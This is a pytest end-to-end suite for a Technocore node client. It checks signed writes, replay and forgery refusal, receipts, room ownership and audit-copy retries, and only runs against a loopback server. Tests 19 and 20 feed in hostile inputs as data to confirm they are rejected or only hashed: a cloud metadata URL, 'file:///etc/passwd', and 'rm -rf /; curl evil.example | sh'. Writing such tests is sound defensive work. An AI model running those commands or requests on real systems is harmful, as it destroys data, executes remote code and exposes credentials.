"""End-to-end against a live Technocore instance.

Skipped unless `TCN_E2E_ORIGIN` is set, because it makes real writes. Point it at a local
instance of the upstream server — which is Apache-2.0 and runs from source — rather than
at the public one:

    git clone https://github.com/flop-labs/technocore-chat && cd technocore-chat
    uv sync
    CHAT_ROOT=/tmp/tc-data \\
    CHAT_RATE_WRITE=6000 CHAT_RATE_READ=6000 CHAT_RATE_ROOMS_PER_DAY=2000 \\
        uv run uvicorn app:app --host 127.0.0.1 --port 8080 --app-dir src

    TCN_E2E_ORIGIN=http://127.0.0.1:8080 uv run pytest tests/e2e -v

The three raised limits matter. A default instance allows 20 new rooms per IP per day, and
this suite opens a fresh room per test so that no two tests can contaminate each other —
against the defaults it exhausts that budget and the rest of the run is 429s.

Testing against a local instance of the *same server source* is not a weaker check than
testing against the public deployment — it is a stronger one. It exercises the real
signature verification, the real sweep and the real ownership rules, and it can assert
refusals (replay, forged signature, unsigned mailbox write) that it would be rude to
generate against a shared service.

Every identity here is generated in memory and dropped when the process exits, every room
is `p-` or derived from a throwaway key, and every job is recorded `internal_test=True`.
None of this is ever counted as third-party usage.
"""

from __future__ import annotations

import json
import os
import secrets
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from technocore_node.config import LOOPBACK_HOSTS
from technocore_node.crypto import didkey
from technocore_node.jobs.runner import JobRunner, RejectedJob
from technocore_node.ledger.db import Ledger
from technocore_node.protocol.client import (
    NonceAllocator,
    TechnocoreClient,
    TechnocoreError,
)
from technocore_node.protocol.envelope import message_payload
from technocore_node.receipts import verify_receipt, verify_result
from technocore_node.service.rooms import mailbox_room, result_room

ORIGIN = os.environ.get("TCN_E2E_ORIGIN", "")


def _loopback_only(origin: str) -> str:
    """Refuse to run this suite against anything but a local server.

    These tests make real writes: they open rooms, post signed messages and claim
    ownership. Pointed at the public instance they would do all of that there, under this
    node's production identity, to a service somebody else runs — and this project has
    already lost a room to one write that arrived in the wrong order.

    The docstring below asks for a local instance. An instruction is not a boundary, and
    the cost of the mistake is unrecoverable, so the boundary is here: a host outside
    loopback aborts collection rather than skipping, because a silent skip is how a
    misconfigured run looks exactly like a passing one.
    """
    if not origin:
        return ""
    host = urlsplit(origin).hostname or ""
    if host not in LOOPBACK_HOSTS:
        raise RuntimeError(
            f"TCN_E2E_ORIGIN={origin!r} is not loopback. This suite makes real writes and "
            "must only ever run against a local instance of the upstream server; see the "
            "module docstring for the command that starts one."
        )
    return origin


ORIGIN = _loopback_only(ORIGIN)

pytestmark = pytest.mark.skipif(
    not ORIGIN, reason="set TCN_E2E_ORIGIN to a loopback origin to run the live suite"
)


class LocalContext:
    def __init__(self, ledger: Ledger) -> None:
        self._ledger = ledger

    def latest_protocol_snapshot(self) -> dict[str, Any] | None:
        return {"captured_at": "2026-01-01T00:00:00Z", "service_version": "0.10.0"}

    def receipt_chain_for(self, job_id: str) -> list[dict[str, Any]]:
        row = self._ledger.get_receipt(job_id)
        return [json.loads(row["receipt_json"])] if row else []


@pytest.fixture
def provider_key() -> Ed25519PrivateKey:
    return Ed25519PrivateKey.generate()


@pytest.fixture
def provider_did(provider_key: Ed25519PrivateKey) -> str:
    return didkey.encode_did(provider_key.public_key())


@pytest.fixture
async def provider(provider_key: Ed25519PrivateKey, provider_did: str, ledger: Ledger):
    client = TechnocoreClient(
        ORIGIN,
        private_key=provider_key,
        did=provider_did,
        nonces=NonceAllocator(floor_lookup=ledger.last_nonce),
    )
    yield client
    await client.aclose()


@pytest.fixture
async def requester():
    key = Ed25519PrivateKey.generate()
    did = didkey.encode_did(key.public_key())
    client = TechnocoreClient(ORIGIN, private_key=key, did=did)
    yield client
    await client.aclose()


# ------------------------------------------------------------------ 1-7 signing


async def test_01_a_generated_did_is_well_formed(provider_did: str) -> None:
    assert didkey.DID_RE.fullmatch(provider_did)
    assert len(provider_did) == 56


async def test_02_a_signed_post_is_accepted(provider: TechnocoreClient) -> None:
    room = f"p-tcn-e2e-{secrets.token_hex(8)}"
    confirmation = await provider.say_signed(room, "signed hello from the e2e suite")
    assert confirmation.seq >= 1


async def test_03_the_write_reads_back_with_our_did_and_nonce(
    provider: TechnocoreClient, provider_did: str
) -> None:
    room = f"p-tcn-e2e-{secrets.token_hex(8)}"
    confirmation = await provider.say_signed(room, "read this back")
    data = await provider.read_room(room, limit=10)
    stored = data["messages"][-1]
    assert stored["from"] == provider_did
    assert int(stored["nonce"]) == confirmation.nonce
    assert stored["text"] == "read this back"


async def test_04_the_stored_record_still_verifies(
    provider: TechnocoreClient, provider_did: str
) -> None:
    """The point of signing the swept text: the record stays re-verifiable later."""
    room = f"p-tcn-e2e-{secrets.token_hex(8)}"
    confirmation = await provider.say_signed(room, "  text with\nwhitespace  ")
    data = await provider.read_room(room, limit=10)
    stored = data["messages"][-1]
    didkey.verify(
        provider_did,
        confirmation.sig,
        message_payload(room, int(stored["nonce"]), stored["text"]),
    )


async def test_05_nonces_increase_across_writes(provider: TechnocoreClient) -> None:
    room = f"p-tcn-e2e-{secrets.token_hex(8)}"
    first = await provider.say_signed(room, "first message")
    second = await provider.say_signed(room, "second message")
    assert second.nonce > first.nonce


async def test_06_a_replayed_nonce_is_refused(
    provider: TechnocoreClient, provider_key: Ed25519PrivateKey, provider_did: str
) -> None:
    """Replaying a captured signed write must not land while the nonce is still the tail."""
    room = f"p-tcn-e2e-{secrets.token_hex(8)}"
    confirmation = await provider.say_signed(room, "original message")

    with pytest.raises(TechnocoreError):
        await provider._request(
            "POST",
            f"/r/{room}",
            json={
                "did": provider_did,
                "sig": confirmation.sig,
                "nonce": str(confirmation.nonce),
                "text": confirmation.text,
            },
        )


async def test_07_a_malformed_signature_is_refused(
    provider: TechnocoreClient, provider_did: str
) -> None:
    room = f"p-tcn-e2e-{secrets.token_hex(8)}"
    for bad_sig in ["A" * 86, "short", "!" * 86]:
        with pytest.raises(TechnocoreError):
            await provider._request(
                "POST",
                f"/r/{room}",
                json={"did": provider_did, "sig": bad_sig, "nonce": "1", "text": "hi"},
            )


async def test_08_an_unsigned_write_to_a_mailbox_is_refused(
    provider: TechnocoreClient, provider_did: str
) -> None:
    """`mb-` rooms take signed writes only — the server enforces it, and we rely on that."""
    mailbox = mailbox_room(provider_did)
    with pytest.raises(TechnocoreError):
        await provider._request("POST", f"/r/{mailbox}", json={"from": "anon", "text": "unsigned"})


# --------------------------------------------------------------- 9-14 lifecycle


@pytest.fixture
def runner(ledger: Ledger, provider_key: Ed25519PrivateKey, provider_did: str) -> JobRunner:
    return JobRunner(ledger, provider_did, provider_key, LocalContext(ledger))


def _job(**overrides: Any) -> str:
    job = {
        "v": "1",
        "type": "job",
        "job_id": f"e2e-{secrets.token_hex(8)}",
        "task": "canonical_json_sha256",
        "reply_room": f"p-tcn-reply-{secrets.token_hex(8)}",
        "input": {"value": {"b": 1, "a": [1, 2]}},
    }
    job.update(overrides)
    return json.dumps(job, ensure_ascii=True, separators=(",", ":"), sort_keys=True)


async def test_09_an_invalid_job_schema_is_refused(runner: JobRunner, provider_did: str) -> None:
    with pytest.raises(RejectedJob):
        await runner.handle(
            text=_job(task="definitely_not_a_task"),
            requester_did=provider_did,
            request_room="mb-test",
            request_seq=1,
            internal_test=True,
        )


async def test_10_a_duplicate_job_id_is_idempotent(runner: JobRunner, provider_did: str) -> None:
    text = _job()
    first = await runner.handle(
        text=text,
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    second = await runner.handle(
        text=text,
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=2,
        internal_test=True,
    )
    assert first is not None
    assert second is None


@pytest.mark.parametrize(
    "task_and_input",
    [
        ("canonical_json_sha256", {"value": {"z": 1, "a": [True, None]}}),
        ("canonical_json_sha256", {"json_text": '{"b":2,"a":1}'}),
        ("protocol_manifest_snapshot", {}),
    ],
)
async def test_11_every_safe_task_completes(
    runner: JobRunner, provider_did: str, task_and_input: tuple[str, dict[str, Any]]
) -> None:
    task, payload = task_and_input
    outcome = await runner.handle(
        text=_job(task=task, input=payload),
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    assert outcome is not None
    assert outcome.result["status"] == "ok", outcome.result.get("error")


async def test_11b_verify_receipt_chain_checks_a_caller_supplied_receipt(
    runner: JobRunner, provider_did: str
) -> None:
    """The fourth task, over a receipt this node produced a moment earlier."""
    first = await runner.handle(
        text=_job(),
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    assert first is not None and first.receipt is not None

    second = await runner.handle(
        text=_job(task="verify_receipt_chain", input={"receipts": [first.receipt]}),
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=2,
        internal_test=True,
    )
    assert second is not None
    assert second.result["status"] == "ok"
    assert second.result["summary"]["all_valid"] is True
    assert second.result["summary"]["duplicate_job_ids"] == []


async def test_12_the_result_carries_a_verifiable_signature(
    runner: JobRunner, provider_did: str
) -> None:
    outcome = await runner.handle(
        text=_job(),
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    assert outcome is not None
    verify_result(outcome.result)


async def test_13_the_receipt_verifies(runner: JobRunner, provider_did: str) -> None:
    outcome = await runner.handle(
        text=_job(),
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    assert outcome is not None and outcome.receipt is not None
    assert verify_receipt(outcome.receipt) == []


async def test_14_the_whole_chain_publishes_to_a_live_reply_room(
    runner: JobRunner, provider: TechnocoreClient
) -> None:
    reply_room = f"p-tcn-chain-{secrets.token_hex(8)}"
    outcome = await runner.handle(
        text=_job(reply_room=reply_room),
        requester_did=provider.did or "",
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    assert outcome is not None and outcome.receipt is not None

    for payload in (outcome.claim, outcome.result, outcome.receipt):
        line = json.dumps(payload, ensure_ascii=True, separators=(",", ":"), sort_keys=True)
        await provider.say_signed(reply_room, line)

    published = await provider.read_room(reply_room, limit=10)
    kinds = [json.loads(m["text"])["type"] for m in published["messages"]]
    assert kinds == ["claim", "result", "receipt"]

    # And the published receipt still verifies after a full round trip through the server.
    receipt = json.loads(published["messages"][-1]["text"])
    assert verify_receipt(receipt) == []


# --------------------------------------------------------------- 15-20 refusals


async def test_15_restart_recovers_the_nonce_floor(
    ledger: Ledger, provider_key: Ed25519PrivateKey, provider_did: str
) -> None:
    """The failure this prevents is silent: after a restart every write is refused."""
    room = f"p-tcn-restart-{secrets.token_hex(8)}"
    first = TechnocoreClient(
        ORIGIN,
        private_key=provider_key,
        did=provider_did,
        nonces=NonceAllocator(floor_lookup=ledger.last_nonce),
    )
    try:
        confirmation = await first.say_signed(room, "before the restart")
        ledger.record_message(
            local_event_id=f"out-{room}-{confirmation.nonce}",
            direction="out",
            room=room,
            did=provider_did,
            nonce=confirmation.nonce,
            normalized_text_sha256="sha256:" + "0" * 64,
            status="confirmed",
        )
    finally:
        await first.aclose()

    ledger.close()
    reopened = Ledger(ledger.path)
    second = TechnocoreClient(
        ORIGIN,
        private_key=provider_key,
        did=provider_did,
        nonces=NonceAllocator(floor_lookup=reopened.last_nonce),
    )
    try:
        after = await second.say_signed(room, "after the restart")
    finally:
        await second.aclose()
    assert after.nonce > confirmation.nonce


async def test_16_the_ledger_survives_a_reopen(ledger: Ledger) -> None:
    assert ledger.integrity_ok()
    reopened = Ledger(ledger.path)
    assert reopened.integrity_ok()


async def test_17_an_oversized_message_is_refused_before_it_is_sent(
    provider: TechnocoreClient,
) -> None:
    room = f"p-tcn-size-{secrets.token_hex(8)}"
    with pytest.raises(Exception, match="too long"):
        await provider.say_signed(room, "x" * 5000)


async def test_18_an_oversized_job_input_is_refused(runner: JobRunner, provider_did: str) -> None:
    with pytest.raises(RejectedJob) as exc:
        await runner.handle(
            text=_job(input={"value": "x" * 4000}),
            requester_did=provider_did,
            request_room="mb-test",
            request_seq=1,
            internal_test=True,
        )
    assert exc.value.code in {"input_too_large", "request_too_large", "input_invalid"}


async def test_19_a_task_cannot_be_given_a_url(runner: JobRunner, provider_did: str) -> None:
    for payload in (
        {"url": "http://169.254.169.254/latest/meta-data/"},
        {"fetch": "file:///etc/passwd"},
    ):
        with pytest.raises(RejectedJob):
            await runner.handle(
                text=_job(task="protocol_manifest_snapshot", input=payload),
                requester_did=provider_did,
                request_room="mb-test",
                request_seq=1,
                internal_test=True,
            )


async def test_20_a_shell_or_code_payload_is_just_data(
    runner: JobRunner, provider_did: str
) -> None:
    """The canonicaliser hashes a shell string. It does not run it — there is no path."""
    outcome = await runner.handle(
        text=_job(input={"value": {"cmd": "rm -rf /; curl evil.example | sh"}}),
        requester_did=provider_did,
        request_room="mb-test",
        request_seq=1,
        internal_test=True,
    )
    assert outcome is not None
    assert outcome.result["status"] == "ok"
    assert outcome.result["summary"]["scheme"] == "RFC8785"


async def test_21_a_room_claim_is_honoured_and_never_stolen(
    provider: TechnocoreClient, provider_did: str
) -> None:
    room = result_room(provider_did)
    assert await provider.room_owner(room) is None
    assert await provider.claim_room(room) is True
    assert await provider.room_owner(room) == provider_did

    # A second claim, from us or anyone, must not overwrite the note.
    assert await provider.claim_room(room) is False

    intruder_key = Ed25519PrivateKey.generate()
    intruder = TechnocoreClient(
        ORIGIN,
        private_key=intruder_key,
        did=didkey.encode_did(intruder_key.public_key()),
    )
    try:
        assert await intruder.claim_room(room) is False
        assert await intruder.room_owner(room) == provider_did
    finally:
        await intruder.aclose()


async def test_22_a_non_owner_cannot_write_to_an_owned_room(
    provider: TechnocoreClient, provider_did: str
) -> None:
    room = result_room(provider_did)
    await provider.claim_room(room)
    await provider.say_signed(room, "the owner can write here")

    intruder_key = Ed25519PrivateKey.generate()
    intruder = TechnocoreClient(
        ORIGIN,
        private_key=intruder_key,
        did=didkey.encode_did(intruder_key.public_key()),
    )
    try:
        with pytest.raises(TechnocoreError):
            await intruder.say_signed(room, "an intruder should not be able to write")
    finally:
        await intruder.aclose()


async def test_23_a_duplicate_text_is_refused_without_a_retry_storm(
    provider: TechnocoreClient,
) -> None:
    """The server refuses repeated text with 422 and says retrying is pointless. This
    asserts the client believes it rather than hammering the write budget."""
    from technocore_node.protocol.client import DuplicateRefused

    room = f"p-tcn-dupe-{secrets.token_hex(8)}"
    text = f"a repeated line long enough to pass the duplicate floor {secrets.token_hex(4)}"
    refused = False
    for _ in range(8):
        try:
            await provider.say_signed(room, text, confirm=False)
        except DuplicateRefused:
            refused = True
            break
    assert refused, "the duplicate filter should have refused a repeated text"


async def test_24_a_receipt_reaches_the_owned_room_as_well_as_the_reply_room(
    ledger: Ledger, provider_key: Ed25519PrivateKey, provider_did: str
) -> None:
    """The auditable copy is the one in the room only this node can write to.

    A reply room belongs to the requester, who can post whatever they like into it, so a
    third party checking this node's claims has to read the owned room instead. This
    asserts the copy is actually there — and that an intruder cannot put one beside it.
    """
    from technocore_node.config import Settings
    from technocore_node.crypto.keystore import Identity
    from technocore_node.service.node import Node

    settings = Settings(
        identity_path=Path("/nonexistent"),
        identity_passphrase_file=None,
        state_dir=Path(ledger.path).parent,
        db_path=Path(ledger.path),
        bind_host="127.0.0.1",
        bind_port=3020,
        # The safety gate requires one: a requester who cannot fetch the receipt back
        # has no way to verify it, so the node declines to produce one.
        public_url="https://example.invalid",
        origin=ORIGIN,
        # Intake is a gate condition, and these tests exercise a node that accepts work.
        # The loop is never started here — `start_background()` is not called — so this
        # switches the gate on without polling anything.
        mailbox_enabled=True,
        http_job_intake_enabled=False,
        watcher_enabled=False,
        max_concurrent_jobs=2,
        job_timeout_seconds=15,
        requester_jobs_per_hour=60,
        flop_testnet_enabled=False,
    )
    node = Node(
        settings,
        identity=Identity(private_key=provider_key, did=provider_did),
        ledger=ledger,
    )
    try:
        assert await node.client.claim_room(node.result_room) is True
        # The gate does not take a claim's word for it: ownership has to be confirmed by
        # a read before the node will do work for anyone. This is the real sequence an
        # operator follows, so the test follows it too.
        await node.observe_reachability()
        assert node.owns_result_room()

        requester_key = Ed25519PrivateKey.generate()
        requester_did = didkey.encode_did(requester_key.public_key())
        reply_room = f"p-tcn-owned-{secrets.token_hex(8)}"
        job_id = f"owned-{secrets.token_hex(6)}"

        await node.process_message(
            {
                "from": requester_did,
                "text": _job(job_id=job_id, reply_room=reply_room),
                "seq": 1,
                "ts": "2026-08-28T00:00:00Z",
                "nonce": 1,
            }
        )

        owned = await node.client.read_room(node.result_room, limit=20)
        kinds = [json.loads(m["text"])["type"] for m in owned["messages"]]
        assert "receipt" in kinds, f"no receipt in the owned room: {kinds}"

        published = json.loads(owned["messages"][-1]["text"])
        assert published["job_id"] == job_id
        assert verify_receipt(published) == []
        assert all(m["from"] == provider_did for m in owned["messages"]), (
            "only the owner's key may have written here"
        )

        reply = await node.client.read_room(reply_room, limit=20)
        assert "receipt" in [json.loads(m["text"])["type"] for m in reply["messages"]]
    finally:
        await node.aclose()


async def test_25_an_internal_test_receipt_stays_out_of_the_owned_room(
    ledger: Ledger, provider_key: Ed25519PrivateKey, provider_did: str
) -> None:
    """The owned room is a public claim about work done for other agents."""
    from technocore_node.config import Settings
    from technocore_node.crypto.keystore import Identity
    from technocore_node.service.node import Node

    settings = Settings(
        identity_path=Path("/nonexistent"),
        identity_passphrase_file=None,
        state_dir=Path(ledger.path).parent,
        db_path=Path(ledger.path),
        bind_host="127.0.0.1",
        bind_port=3020,
        # The safety gate requires one: a requester who cannot fetch the receipt back
        # has no way to verify it, so the node declines to produce one.
        public_url="https://example.invalid",
        origin=ORIGIN,
        # Intake is a gate condition, and these tests exercise a node that accepts work.
        # The loop is never started here — `start_background()` is not called — so this
        # switches the gate on without polling anything.
        mailbox_enabled=True,
        http_job_intake_enabled=False,
        watcher_enabled=False,
        max_concurrent_jobs=2,
        job_timeout_seconds=15,
        requester_jobs_per_hour=60,
        flop_testnet_enabled=False,
    )
    node = Node(
        settings,
        identity=Identity(private_key=provider_key, did=provider_did),
        ledger=ledger,
    )
    try:
        await node.client.claim_room(node.result_room)
        await node.observe_reachability()
        requester_key = Ed25519PrivateKey.generate()
        await node.process_message(
            {
                "from": didkey.encode_did(requester_key.public_key()),
                "text": _job(reply_room=f"p-tcn-int-{secrets.token_hex(8)}"),
                "seq": 1,
                "ts": "2026-08-28T00:00:00Z",
                "nonce": 1,
            },
            internal_test=True,
        )
        owned = await node.client.read_room(node.result_room, limit=20)
        assert owned["messages"] == [], "an internal test must not appear as public work"
    finally:
        await node.aclose()


async def test_26_a_failed_audit_copy_is_retried_until_it_lands(
    ledger: Ledger, provider_key: Ed25519PrivateKey, provider_did: str
) -> None:
    """The owned-room copy is owed, not best-effort.

    Simulates the write failing exactly once — a rate limit, an upstream at capacity —
    and asserts the receipt is recorded as owed and then actually published on the next
    reconciliation pass, rather than the requester quietly holding the only copy.
    """
    from technocore_node.config import Settings
    from technocore_node.crypto.keystore import Identity
    from technocore_node.service.node import Node

    settings = Settings(
        identity_path=Path("/nonexistent"),
        identity_passphrase_file=None,
        state_dir=Path(ledger.path).parent,
        db_path=Path(ledger.path),
        bind_host="127.0.0.1",
        bind_port=3020,
        # The safety gate requires one: a requester who cannot fetch the receipt back
        # has no way to verify it, so the node declines to produce one.
        public_url="https://example.invalid",
        origin=ORIGIN,
        # Intake is a gate condition, and these tests exercise a node that accepts work.
        # The loop is never started here — `start_background()` is not called — so this
        # switches the gate on without polling anything.
        mailbox_enabled=True,
        http_job_intake_enabled=False,
        watcher_enabled=False,
        max_concurrent_jobs=2,
        job_timeout_seconds=15,
        requester_jobs_per_hour=60,
        flop_testnet_enabled=False,
    )
    node = Node(
        settings,
        identity=Identity(private_key=provider_key, did=provider_did),
        ledger=ledger,
    )
    try:
        assert await node.client.claim_room(node.result_room) is True
        # The gate does not take a claim's word for it: ownership has to be confirmed by
        # a read before the node will do work for anyone. This is the real sequence an
        # operator follows, so the test follows it too.
        await node.observe_reachability()
        assert node.owns_result_room()

        real_publish = node.publish
        failed_once = {"done": False}

        async def publish_failing_the_owned_room_once(room: str, obj: dict[str, Any]):
            if room == node.result_room and not failed_once["done"]:
                failed_once["done"] = True
                return None
            return await real_publish(room, obj)

        node.publish = publish_failing_the_owned_room_once  # type: ignore[method-assign]

        requester_key = Ed25519PrivateKey.generate()
        job_id = f"retried-{secrets.token_hex(5)}"
        await node.process_message(
            {
                "from": didkey.encode_did(requester_key.public_key()),
                "text": _job(job_id=job_id, reply_room=f"p-tcn-retry-{secrets.token_hex(8)}"),
                "seq": 1,
                "ts": "2026-08-28T00:00:00Z",
                "nonce": 1,
            }
        )

        assert failed_once["done"], "the owned-room write should have been attempted"
        assert ledger.audit_backlog()["owed"] == 1, "the public copy must be recorded as owed"
        assert ledger.get_receipt(job_id)["audit_seq"] is None

        node.publish = real_publish  # type: ignore[method-assign]
        assert await node.reconcile_audit_copies() == 1
        assert ledger.audit_backlog()["owed"] == 0
        assert ledger.get_receipt(job_id)["audit_seq"] is not None

        # A second pass must be a no-op: the room sync sees the copy already there.
        assert await node.reconcile_audit_copies() == 0

        owned = await node.client.read_room(node.result_room, limit=20)
        published = [json.loads(m["text"]) for m in owned["messages"]]
        matching = [r for r in published if r.get("job_id") == job_id]
        assert len(matching) == 1, "exactly one copy, not zero and not a duplicate"
        assert verify_receipt(matching[0]) == []
    finally:
        await node.aclose()


async def test_27_a_copy_that_landed_before_a_crash_is_not_published_twice(
    ledger: Ledger, provider_key: Ed25519PrivateKey, provider_did: str
) -> None:
    """The crash window between publishing and recording must not cost a duplicate.

    Simulates exactly that: the receipt reaches the owned room, but the node dies before
    writing `audit_seq`. On restart the row still says `owed`, so without consulting the
    room the reconciler would post a second copy — and an audit record showing one job
    twice is not much better than one showing it never.
    """
    from technocore_node.config import Settings
    from technocore_node.crypto.keystore import Identity
    from technocore_node.service.node import Node

    settings = Settings(
        identity_path=Path("/nonexistent"),
        identity_passphrase_file=None,
        state_dir=Path(ledger.path).parent,
        db_path=Path(ledger.path),
        bind_host="127.0.0.1",
        bind_port=3020,
        # The safety gate requires one: a requester who cannot fetch the receipt back
        # has no way to verify it, so the node declines to produce one.
        public_url="https://example.invalid",
        origin=ORIGIN,
        # Intake is a gate condition, and these tests exercise a node that accepts work.
        # The loop is never started here — `start_background()` is not called — so this
        # switches the gate on without polling anything.
        mailbox_enabled=True,
        http_job_intake_enabled=False,
        watcher_enabled=False,
        max_concurrent_jobs=2,
        job_timeout_seconds=15,
        requester_jobs_per_hour=60,
        flop_testnet_enabled=False,
    )
    node = Node(
        settings,
        identity=Identity(private_key=provider_key, did=provider_did),
        ledger=ledger,
    )
    try:
        assert await node.client.claim_room(node.result_room) is True
        # The gate does not take a claim's word for it: ownership has to be confirmed by
        # a read before the node will do work for anyone. This is the real sequence an
        # operator follows, so the test follows it too.
        await node.observe_reachability()
        assert node.owns_result_room()

        requester_key = Ed25519PrivateKey.generate()
        job_id = f"crashed-{secrets.token_hex(4)}"
        await node.process_message(
            {
                "from": didkey.encode_did(requester_key.public_key()),
                "text": _job(job_id=job_id, reply_room=f"p-tcn-crash-{secrets.token_hex(8)}"),
                "seq": 1,
                "ts": "2026-08-28T00:00:00Z",
                "nonce": 1,
            }
        )
        assert ledger.get_receipt(job_id)["audit_seq"] is not None

        # Rewind the ledger to the instant before the record: the copy is in the room,
        # the database does not know it, and the room cursor has not moved.
        with ledger.tx() as conn:
            conn.execute(
                "UPDATE receipts SET audit_seq = NULL, audit_state = 'owed' WHERE job_id = ?",
                (job_id,),
            )
            conn.execute("DELETE FROM cursors WHERE room = ?", (node.result_room,))
        assert ledger.audit_backlog()["owed"] == 1

        # The sync recognises the existing copy instead of posting another.
        assert await node.sync_owned_room() == 1
        assert ledger.audit_backlog()["owed"] == 0
        assert await node.reconcile_audit_copies() == 0

        owned = await node.client.read_room(node.result_room, limit=50)
        copies = [m for m in owned["messages"] if json.loads(m["text"]).get("job_id") == job_id]
        assert len(copies) == 1, f"expected exactly one copy, found {len(copies)}"
    finally:
        await node.aclose()
